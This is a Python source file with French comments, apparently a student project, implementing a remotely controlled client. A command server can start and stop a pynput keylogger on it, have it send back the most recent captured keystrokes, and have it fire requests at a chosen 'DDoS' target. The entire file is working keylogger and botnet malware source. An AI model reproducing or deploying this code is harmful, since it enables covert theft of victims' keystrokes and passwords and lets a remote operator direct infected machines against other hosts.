import socket
import logging
from pynput import keyboard
import requests
import time


host = "localhost"      #ip du serveur sur lequelle on souhaite se connecter
port = 61589            #port du serveur sur lequelle on souhaite se connecter

logging.basicConfig(filename = (r"C:\Users\Admin\Documents\Projet développement\keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

class Client():
    
    def __init__(self, socket, client_adresse):                 #On reçoit le socket et la variable client_adresse qui contient l'IP et le port 

        self.socket = socket
        self.client_adresse = client_adresse
        self.listener = keyboard.Listener()                     #On déclare que listener va écouter le clavier 
        self.initialisation()                                   #On déclare notre méthode qui va écouter en boucle 


    def connexion(self, socket, client_adresse):
        try:
            socket.connect(client_adresse)                     #On se connecte au serveur
            print("connecté !")                                #On reçoit un ordre      
            ordre = socket.recv(1024).decode("utf-8")

            while True :                                      #On en fonction de l'ordre reçu on appelle un méthode 
                
                    
                if ordre == "start_Keylogger" :
                    self.listener.start()                     #On autorise le listener à écrire dans le fichier du keylogger       
                    print("keylogger fonctionne")
                    socket.send("Le keylogger est lancé".encode("utf-8"))
    
                elif ordre == "start_ddos":
                    self.ddos_attaque(socket)
                    socket.send("Requête réalisée avec succes ".encode("utf-8"))    
                        
                elif ordre == "stop_Keylogger":
                    self.listener.stop()                      #On stop l'écriture dans le fichier 
                    print("stop keylogger")
                    socket.send("Le keylogger est fermé".encode("utf-8"))
                       
                elif  ordre == "get_log":
                    self.envoi_log(socket)
                    print("Envoie des valeurs !")

                elif ordre == "fin_connexion":
                    socket.send("Le Client est ferme".encode("utf-8"))
                    break
                    
                ordre = socket.recv(1024).decode("utf-8")

                    
        except ConnectionRefusedError:
            print("La connexion au serveur à échouée ")
            

    def commence_keylogger(self, key):                                          #Méthode qui  force le type puis on stock grace à la ligne loggin au-dessus du code
        logging.info(str(key))

    def initialisation(self):                                                   #Méthode qui lance l'écoute du clavier tout le temps 
        self.listener = keyboard.Listener(on_press=self.commence_keylogger)

    def ddos_attaque(self, socket):                                             #Méthode qui permet de lancer l'attaque ddos   
        ip_ddos = socket.recv(1024).decode("utf-8")                             #On reçoit une cible et le temps 
        temps_en_seconde = socket.recv(1024).decode("utf-8")                    #On lance la requête vers la cible 

        temps_en_seconde = int(temps_en_seconde)
        time.sleep(temps_en_seconde) 

        Ma_requete = requests.get(ip_ddos)                             
        if Ma_requete.status_code == 200 : 
            print("Requête réalisée avec succes ")
        else :
            print("Erreur lors de la requête")

    def envoi_log(self, socket):                                        #Méthode qui envoie les logs 
        with open("keyLog.txt", "r") as key_log:                        #On ouvre le fichier du keylogger

            nb_lignes = 0                                       
            lignes_key_log = key_log.readlines()                        #On compte le nombre de ligne présent dans le fichier 


            for lignes in lignes_key_log:
                nb_lignes += 1

            nb_lignes_demande = socket.recv(1024).decode("utf-8")     #On décode le nombre que souhaite le maitre
            nb_lignes_demande = int(nb_lignes_demande)                #On inverse les lignes du fichier 
            lignes_key_log.reverse()                                  #On selection et on envoie toutes les lignes demandées 

            commencer_par_la_fin = str(lignes_key_log[:nb_lignes_demande])
            socket.send(commencer_par_la_fin.encode("utf-8"))          


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                   #On instancie notre socket

client_adresse = ((host, port))                                          #On lui donne une IP et une adresse déclarer au-dessus en dur  

Client = Client(s, client_adresse)
Client.initialisation()                                                 #On appel les méthode pour lancer le programme  
Client.connexion(s, client_adresse)

print("Fin de la connection")
s.close()                                                               #On ferme la connexion
